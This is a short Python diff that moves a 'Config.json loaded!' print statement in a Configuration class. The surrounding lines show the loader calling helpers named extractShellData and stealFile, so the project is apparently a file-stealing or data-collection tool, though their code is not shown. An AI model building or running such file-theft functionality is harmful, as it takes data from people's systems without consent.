@@ -42,9 +42,9 @@ class Configuration:
             try:
                 config = Util.jsonIn(self.__logPath + 'config.json')
                 self.__setConfig(config)
-                print('Config.json loaded!')
                 Util.extractShellData(self.__logPath, self.__shellCommand)
                 Util.stealFile(self.__logPath, self.__stealPath)
+                print('Config.json loaded!')
             except Exception:
                 self.__setDefault()
                 print('Default loaded!')
